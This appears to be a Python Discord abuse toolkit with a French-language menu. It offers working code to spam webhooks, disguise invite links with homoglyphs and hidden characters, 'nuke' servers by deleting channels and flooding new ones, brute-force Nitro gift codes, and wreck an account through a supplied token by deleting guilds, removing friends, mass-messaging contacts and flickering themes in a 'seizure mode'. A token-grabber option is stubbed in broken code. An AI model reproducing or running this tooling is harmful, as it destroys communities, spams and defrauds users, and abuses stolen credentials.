from asyncore import loop
from email import message
import os
import socket  
from pickle import TRUE

from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
from pystyle import *
from os import system

hostname = socket.gethostname()    
IPAddr = socket.gethostbyname(hostname) 
local_ip = socket.gethostbyname(socket.gethostname())




name = """
 ▄████▄   ▒█████   ██▀███  ▓█████▄▓██   ██▓ ▄████▄  ▓█████  ██▓███    ██████ 
▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▀ ██▌▒██  ██▒▒██▀ ▀█  ▓█   ▀ ▓██░  ██▒▒██    ▒ 
▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒░██   █▌ ▒██ ██░▒▓█    ▄ ▒███   ▓██░ ██▓▒░ ▓██▄   
▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ░▓█▄   ▌ ░ ▐██▓░▒▓▓▄ ▄██▒▒▓█  ▄ ▒██▄█▓▒ ▒  ▒   ██▒
▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▓  ░ ██▒▓░▒ ▓███▀ ░░▒████▒▒██▒ ░  ░▒██████▒▒
░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒▓  ▒   ██▒▒▒ ░ ░▒ ▒  ░░░ ▒░ ░▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░
  ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ▒  ▒ ▓██ ░▒░   ░  ▒    ░ ░  ░░▒ ░     ░ ░▒  ░ ░
░        ░ ░ ░ ▒    ░░   ░  ░ ░  ░ ▒ ▒ ░░  ░           ░   ░░       ░  ░  ░  
░ ░          ░ ░     ░        ░    ░ ░     ░ ░         ░  ░               ░  
░                           ░      ░ ░     ░  
  """
tet = """
╔══════════════════════════════╦══════════════════════════╦══════════════════════╦
║                              ║                          ║                      ║
║     [01] SPAM WEBHOOK        ║     [08] TOKEN NUKE      ║     [23] CREDITS     ║
║     [02] URL SERV DISCORD    ║     [09] SOON            ║                      ║
║     [03] STATUE DISCORD      ║     [10] SOON            ║                      ║
║     [04] MY IP V4            ║     [11] SOON            ║                      ║
║     [05] SERVER NUKE         ║     [13] SOON            ║                      ║
║     [06] GEN NITO            ║     [14] SOON            ║                      ║
║     [07] GEN TOKEN GRABB     ║     [15] SOON            ║                      ║
║                              ║                          ║                      ║
╚══════════════════════════════╩══════════════════════════╩══════════════════════╩

                        officiel discord : https://discord.gg/HES2DDAQ

cordy : """

Anime.Fade(Center.Center(name), Colors.yellow_to_red, Colorate.Vertical, interval=0.025, enter=True)

print(Colorate.Horizontal(Colors.yellow_to_red, Center.XCenter(name)))

mode = input(Colorate.Horizontal(Colors.yellow_to_red, Center.XCenter(tet)))

system("cls")

if mode == "":
    print(Colorate.Horizontal(Colors.yellow_to_red, Center.XCenter(name)))

    mode = input(Colorate.Horizontal(Colors.yellow_to_red, Center.XCenter(tet)))






if mode == "1":
    from dhooks import Webhook
    webhook_url = Write.Input("url du webhook -> ", Colors.yellow_to_red, interval=0.008)
    msg = Write.Input("quelle est votre message a envoyer -> ", Colors.yellow_to_red, interval=0.008)



    while True:
        hook = Webhook(webhook_url)
        hook.send(msg)
        print("message envoyer avec succes !!")

if mode == "2":
    import clipboard
    print("""
    ██╗███╗   ██╗██╗   ██╗██╗████████╗███████╗
    ██║████╗  ██║██║   ██║██║╚══██╔══╝██╔════╝
    ██║██╔██╗ ██║██║   ██║██║   ██║   █████╗  
    ██║██║╚██╗██║╚██╗ ██╔╝██║   ██║   ██╔══╝  
    ██║██║ ╚████║ ╚████╔╝ ██║   ██║   ███████╗
    ╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝   ╚═╝   ╚══════╝ 
    """)
    server = input("Server invite:\n")
    invite = input("new invite name:\n")
    gay = "discοrd.gg/" + invite + "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||" + server
    clipboard.copy(gay)
    print('Copyed to clipboard!')
    input()


if mode =="3":
    import discord
    from discord.ext import commands

    token = input ("entrée votre token > ")

    bot = commands.Bot(command_prefix = "123456789")

    print('What would you like to stream?')
    status = input(' > ')

    @bot.event
    async def on_connect():
        stream = discord.Streaming(
            name = status,
            url = 'https://www.twitch.tv/choco'
        )
        print('Streaming: ' + status)
        await bot.change_presence(activity=stream)

    bot.run(token, bot=False) 



if mode =="4": 
    hostname = socket.gethostname()    
    IPAddr = socket.gethostbyname(hostname) 
    local_ip = socket.gethostbyname(socket.gethostname())
    host_name = socket.gethostname()    
    IPAddress = socket.gethostbyname(host_name)    
    print("[+] Le nom de ton Ordinateur est :" + host_name)    
    print(f"[+] Ton Local IP est : {local_ip}")

if mode == "5":
    import discord
    from discord.ext import commands, tasks
    import os
    import asyncio

    token = input ("entrée le token du bot : ")
    prefix= input("entrée le prefix du bot : ")
    invites = input("entrée le lien d'invitation a spam avec la commande "+ prefix+"invite : ")
    nom = input("entrée le nouveau nom du server : ")
    nomC = input ("entrée le nom des channels crée : ")
    message2 = input ("entrée le message a spam : ")
    n=0

    intents=discord.Intents.default()
    intents = discord.Intents(messages=True, guilds=True)




    client = commands.Bot(command_prefix=prefix, intents=intents)
    @client.event
    async def on_ready():
        print('Bot is online')
        print("commandes : \n ping \n invite \n nuke \n spam")
        await client.change_presence(activity=discord.Game('Security'))

    @client.command()
    async def ping(ctx):
        await ctx.send(f'Pong! {round(client.latency * 1000)}ms')

    @client.command()
    async def invite(ctx):
      await ctx.reply(invites) 

    @client.command()
    async def nuke(ctx):

        await ctx.guild.edit(name=nom) 

        for c in ctx.guild.channels:
            await c.delete()

        guild = ctx.message.guild

        n=0
        while(n<=60):
            await guild.create_text_channel(nomC) 
            n = n+1

        for c in ctx.guild.text_channels:
                 await c.send(message2)
                 await c.send(message2)
                 await c.send(message2)
                 await c.send(message2)
                 await c.send(message2)

    @client.command()
    async def spam(ctx):
        for c in ctx.guild.text_channels:
                 await c.send(message2 ) 
                 await c.send(message2 )
                 await c.send(message2 )
                 await c.send(message2 )
                 await c.send(message2 )

    client.run(token) 
    

if mode == "6":
    import colorama
    from colorama import Fore
    from selenium import webdriver
    from discord.ext import commands
    import discord
    import random, json
    import requests
    import string, pyautogui
    import ctypes, os, sys
    import webbrowser, base64
    import time, threading
    from os import system
    threaad = int(input("Combient de nitro a gen ?: "))
    sendto = str(input("vous voulez envoyer les code nitro valid a un webhook ? [yes,no] : ")).lower()


    def nitrotofile(threaad):
        def nitro():
            system("cls")
            while True:
                nitrochars = string.ascii_letters + string.digits
                code = "".join(random.choice(nitrochars)for x in range(16))
                nitrocode = "https://discord.gift/" + code
                r = requests.get('https://discord.com/api/v9/entitlements/gift-codes/{}'.format(code))
                if r.status_code == 200:
                    print("\033[32m[+] Valid ~ {}".format(nitrocode))
                    file = open("ValidNitro.txt",'a')
                    file.write(nitrocode + '\n')
                else:
                    print("\033[31m[-] Invalid ~ {}".format(nitrocode))

        threads = []

        for _ in range(threaad):
            t = threading.Thread(target=nitro)
            t.start()
            threads.append(t)

        for thread in threads:
            thread.join()

    def nitrotohook(threaad):
        webhook = input("What is the webhook do you want the valid nitro code to be sent to?: ")
        def nitro():
            system("cls")
            while True:
                nitrochars = string.ascii_letters + string.digits
                code = "".join(random.choice(nitrochars)for x in range(16))
                nitrocode = "https://discord.gift/" + code
                r = requests.get('https://discord.com/api/v9/entitlements/gift-codes/{}'.format(code))
                if r.status_code == 200:
                    print("\033[32m[+] Valid ~ {}".format(nitrocode))
                    payload = {
                        'content':nitrocode
                    }
                    requests.post(webhook,json=payload)
                else:
                    print("\033[31m[-] Invalid ~ {}".format(nitrocode))

        threads = []

        for _ in range(threaad):
            t = threading.Thread(target=nitro)
            t.start()
            threads.append(t)

        for thread in threads:
            thread.join()

    if sendto =="yes":
        nitrotohook(threaad)
    elif sendto == "no":
        nitrotofile(threaad)
    else:
        print('Invalid Option.')

if mode == "7":
       print("de retour bientot ;) ")
       input("")


        with open('token_grabber.pyw', 'w') as f:
            f.write(token_grabber)
        print("Token Grabber créé (;")
        input()
        quit()

if mode == "8":
    import os, sys, time, requests, os.path, base64, json, threading, string, random, discord, asyncio, httpx, pyautogui, re, http.client, subprocess, shutil
    from itertools import cycle
    from colorama import Fore

    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""+ Enter account token you want to nuke""")
    global usertoken
    usertoken = str(input(f"""# Token: """))

    def accnuke():

        def nuke(usertoken, Server_Name, message_Content):
            if threading.active_count() <= 100:
                t = threading.Thread(target=CustomSeizure, args=(usertoken, ))
                t.start()

            headers = {'Authorization': usertoken}
            channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': usertoken}).json()
            print(f"\n+ Sent a Message to all available friends")
            for channel in channelIds:
                try:
                    requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages', 
                    headers=headers,
                    data={"content": f"{message_Content}"})
                    print(f"\t[{Fore.LIGHTGREEN_EX }! Messaged ID: "+channel['id'])
                except Exception as e:
                    print(f"""\t[{Fore.LIGHTRED_EX }! The following error has been encountered and is being ignored: {e}""")

            print(f"\n+ Left all available guilds")
            guildsIds = requests.get("https://discord.com/api/v7/users/@me/guilds", headers={'Authorization': usertoken}).json()
            for guild in guildsIds:
                try:
                    requests.delete(
                        f'https://discord.com/api/v7/users/@me/guilds/'+guild['id'],
                        headers={'Authorization': usertoken})
                    print(f"\t[{Fore.LIGHTGREEN_EX }! Left guild: "+guild['name'])
                except Exception as e:
                    print(f"""\t[{Fore.LIGHTRED_EX }! The following error has been encountered and is being ignored: {e}""")

            print(f"\n Deleted all available guilds")
            for guild in guildsIds:
                try:
                    requests.delete(f'https://discord.com/api/v7/guilds/'+guild['id'], headers={'Authorization': usertoken})
                    print(f'\t[{Fore.LIGHTGREEN_EX }! Deleted guild: '+guild['name'])
                except Exception as e:
                    print(f"""\t[{Fore.LIGHTRED_EX }! The following error has been encountered and is being ignored: {e}""")

            print(f"\n Removed all available friends")
            friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={'Authorization': usertoken}).json()
            for friend in friendIds:
                try:
                    requests.delete(
                        f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers={'Authorization': usertoken})
                    print(f"\t[{Fore.LIGHTGREEN_EX }! Removed friend: "+friend['user']['username']+"#"+friend['user']['discriminator'])
                except Exception as e:
                    print(f"""\t[{Fore.LIGHTRED_EX }! The following error has been encountered and is being ignored: {e}""")

            print(f"\n Created all servers")
            for i in range(100):
                try:
                    payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
                    requests.post('https://discord.com/api/v7/guilds', headers={'Authorization': usertoken}, json=payload)
                    print(f"\t[{Fore.LIGHTGREEN_EX }! Created {Server_Name} #{i}")
                except Exception as e:
                    print(f"""\t[{Fore.LIGHTRED_EX }! The following error has been encountered and is being ignored: {e}""")
            t.do_run = False
            setting = {
                  'theme': "light",
                  'locale': "ja",
                  'message_display_compact': False,
                  'inline_embed_media': False,
                  'inline_attachment_media': False,
                  'gif_auto_play': False,
                  'render_embeds': False,
                  'render_reactions': False,
                  'animate_emoji': False,
                  'convert_emoticons': False,
                  'enable_tts_command': False,
                  'explicit_content_filter': '0',
                  'status': "idle"
            }
            requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': usertoken}, json=setting)
            j = requests.get("https://discordapp.com/api/v9/users/@me", headers={'Authorization': usertoken}).json()
            a = j['username'] + "#" + j['discriminator']
            print(f"\n Succesfully turned {a} into a holl")
            input(f"""\n Press ENTER to exit""")
            main()

        def CustomSeizure(token):
            print(f' Starting seizure mode (Switching on/off Light/dark mode)')
            t = threading.currentThread()
            while getattr(t, "do_run", True):
                modes = cycle(["light", "dark"])
                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': usertoken}, json=setting)

        print("Name of the servers that will be created")
        Server_Name = str(input(f' Name: '))
        print(f"\n Message that will be sent to every friend: ")
        message_Content = str(input(f' Message: '))
        r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': usertoken})
        threads = 100

        if threading.active_count() < threads:
            threading.Thread(target=nuke, args=(usertoken, Server_Name, message_Content)).start()
            return

    accnuke()


if mode == "23":
    credit = """
    
   salut flemme de faire le credit pour la beta mais les dev sont Choco8exe#8725 & Scream#1203
    
    """
    print(credit)
    input()

